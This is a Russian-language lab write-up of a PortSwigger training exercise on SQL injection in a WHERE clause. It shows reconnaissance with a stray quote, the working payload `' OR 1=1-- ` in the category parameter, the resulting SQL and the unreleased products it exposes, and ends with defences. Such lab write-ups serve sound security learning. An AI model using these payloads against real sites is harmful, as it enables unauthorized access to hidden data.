# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

**Ссылка:** https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
**Статус:** ✅ Solved
**Дата:** 2026-10-11

## Что уязвимо

Параметр `category` в `/filter` подставляется в SQL-запрос без параметризации:

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

## Разведка

1. Кликнул категорию → запрос `GET /filter?category=Corporate+gifts`.
2. Отправил в Repeater.
3. Добавил `'` → **500 Internal Server Error**. Признак SQLi.
4. Понял: шаблон `'ВВОД'` + ввод с кавычкой = `''` (две кавычки подряд), SQL ломается.

## Пейлоад

GET /filter?category=Corporate+gifts'+OR+1=1--+

Декодированный SQL:

SELECT * FROM products WHERE category = 'Corporate gifts' OR 1=1--' AND released = 1

- `'` — закрывает строку
- `OR 1=1` — всегда истина
- `--` — комментарий, отрезает `' AND released = 1`

## Результат

- **200 OK**
- **20 товаров** вместо обычных нескольких
- Включая невыпущенные (`released = 0`)

Проверка через браузер → лаба **Solved** ✅.

## Защита

- Параметризованные запросы (prepared statements).
- Валидация ввода.
- Минимальные права пользователя БД.
